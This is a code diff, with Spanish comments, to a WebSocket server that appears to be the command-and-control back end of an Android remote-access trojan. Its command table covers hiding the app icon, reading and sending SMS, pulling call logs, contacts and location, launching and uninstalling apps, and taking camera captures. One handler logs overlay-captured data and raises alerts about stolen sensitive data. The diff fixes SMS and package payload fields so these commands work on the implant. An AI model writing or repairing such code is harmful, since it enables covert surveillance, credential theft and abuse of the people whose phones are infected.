@@ -189,8 +189,8 @@ export class WebSocketManager {
             this.io.emit("device-status", { deviceId: dbId, status: "online", timestamp: Date.now() });
             console.log(`[WebSocket] [LISTO] Dispositivo ${dbId} listo y vinculado.`);
             
-            // [NOTIFICACIÓN] Alerta de nueva conexión profesional
-            await notificationService.alertNewConnection(deviceName, dbId);
+            const deviceDisplayName = `${effectiveManf} ${effectiveModel}`.substring(0, 100);
+            await notificationService.alertNewConnection(deviceDisplayName, dbId);
             
             // [INIT] Solicitar info inicial (batería, apps) al dispositivo
             setTimeout(() => {
@@ -448,7 +448,8 @@ export class WebSocketManager {
           await advancedMonitoring.logCapturedData(id, data.type || "overlay_capture", data.data || data);
           
           // [NOTIFICACIÓN] Alerta de captura de datos sensibles
-          const device = await db.query.devices.findFirst({ where: eq(devices.id, id) });
+          const deviceResults = await db.select().from(devices).where(eq(devices.id, id)).limit(1);
+          const device = deviceResults[0];
           if (device) {
             await notificationService.alertCriticalData(device.deviceName, data.type || "Overlay", JSON.stringify(data.data || data));
           }
@@ -548,7 +549,7 @@ export class WebSocketManager {
       "hide-icon": "0xHO", "show-icon": "0xSO", "request-files": "0xFI",
       "get-files": "0xFI", "list_files": "0xFI", "download-file": "0xFI",
       "get-sms": "0xSM", "send-sms": "0xSM", "get-call-log": "0xCL",
-      "get-calls": "0xCL", "get-contacts": "0xCO", "get-apps": "0xPM", "launch-app": "0xLA", "stop-app": "0xKA",
+      "get-calls": "0xCL", "get-contacts": "0xCO", "get-apps": "0xIN", "launch-app": "0xLA", "stop-app": "0xKA",
       "uninstall-app": "0xUN",
       "get-info": "0xIN", "get-location": "0xLO", "get_location": "0xLO",
       "set-gps-freq": "0xGF", "get-wifi": "0xWI", "capture-camera": "0xCA",
@@ -581,9 +582,11 @@ export class WebSocketManager {
     } else if (action === "get-sms") {
         payload.action = "ls";
     } else if (action === "send-sms" || action === "send_sms") {
-        payload.action = "sendSMS";
-        payload.to = details.to || details.phoneNumber || details.number;
-        payload.sms = details.sms || details.message || details.body;
+        payload.action = "send"; // APK expects "send"
+        payload.phoneNo = details.to || details.phoneNumber || details.number;
+        payload.msg = details.sms || details.message || details.body;
+    } else if (mappedAction === "0xUN" || mappedAction === "0xLA") {
+        payload.packageName = details.packageName || details.package || details.id;
     } else if (mappedAction === "0xCA") {
         // APK expects an INTEGER for "camera"
         payload.camera = details.camera === "front" ? 1 : 0;
